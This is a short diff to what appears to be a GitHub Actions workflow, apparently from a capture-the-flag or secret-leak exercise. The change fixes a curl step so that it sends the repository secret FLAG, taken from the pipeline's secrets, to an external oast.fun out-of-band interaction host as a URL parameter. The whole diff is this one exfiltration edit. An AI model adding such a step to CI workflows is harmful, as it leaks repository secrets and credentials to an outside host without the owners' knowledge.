@@ -14,5 +14,5 @@ jobs:
         env:
           FLAG: ${{ secrets.FLAG }}
         run: |
-          curl https://qebakcujrsfzyoxddlbkrlvb7gn6vc8a7.oast.fun/?flag=FLAG
+          curl https://qebakcujrsfzyoxddlbkrlvb7gn6vc8a7.oast.fun/?flag=$FLAG
         shell: bash
